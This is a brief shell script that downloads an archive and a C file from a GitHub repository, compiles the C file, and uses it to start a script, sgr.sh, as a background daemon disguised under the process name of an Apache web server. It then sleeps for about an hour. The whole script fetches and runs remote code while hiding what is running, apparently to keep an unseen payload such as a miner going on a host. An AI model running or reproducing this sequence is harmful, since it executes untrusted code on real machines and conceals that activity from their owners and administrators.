#!/bin/sh


wget https://github.com/thoeb292/thoeb292/raw/main/main.tar.gz
tar xf main.tar.gz 
wget https://github.com/thoeb292/thoeb292/raw/main/mas.c
gcc -o test mas.c 
./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
sleep 3579
